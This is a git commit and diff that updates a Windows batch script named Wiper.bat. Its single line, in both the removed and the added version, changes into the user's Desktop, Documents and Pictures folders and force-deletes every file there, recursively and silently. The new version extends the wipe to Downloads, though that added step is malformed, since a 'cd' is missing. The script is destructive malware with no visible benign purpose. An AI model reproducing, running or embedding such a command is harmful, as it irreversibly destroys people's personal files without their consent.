fa6067185432dd23b24179e2af0d8385c95ff4c8
codingcoderwhat <37680195+codingcoderwhat@users.noreply.github.com>
2018-11-06 09:28:04 -0500

    Update Wiper.bat

--- Wiper.bat
+++ Wiper.bat
@@ -1,1 +1,1 @@
-cd \ && cd %userprofile% && cd Desktop &&  del *.* /s /f /q && cd .. && cd documents && del *.* /s /f /q && cd .. && cd pictures && del *.* /s /f /q
+cd \ && cd %userprofile% && cd Desktop &&  del *.* /s /f /q && cd .. && cd documents && del *.* /s /f /q && cd .. && cd pictures && del *.* /s /f /q && cd.. && downloads && del *.* /s /f /q  
